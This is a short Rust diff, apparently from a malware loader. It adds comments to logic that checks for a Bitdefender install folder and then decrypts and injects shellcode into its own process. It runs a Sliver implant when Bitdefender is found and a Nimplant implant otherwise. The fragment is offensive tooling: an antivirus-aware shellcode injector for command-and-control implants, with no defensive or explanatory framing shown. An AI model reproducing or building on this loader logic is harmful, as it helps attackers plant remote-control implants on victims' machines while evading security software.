@@ -93,9 +93,11 @@ fn main() {
     let dir_path = PathBuf::from("C:\\Program Files\\Bitdefender");
   
     if Path::new(&dir_path).exists() && dir_path.is_dir() {
+	//Execute Sliver bin
         let mut injector = Injector::new(decrypt_shellcode_stub_sliv());
         injector.run_in_current_process();
     } else {
+	//Execute Nimplant bin
         let mut injector = Injector::new(decrypt_shellcode_stub());
         injector.run_in_current_process();
     }
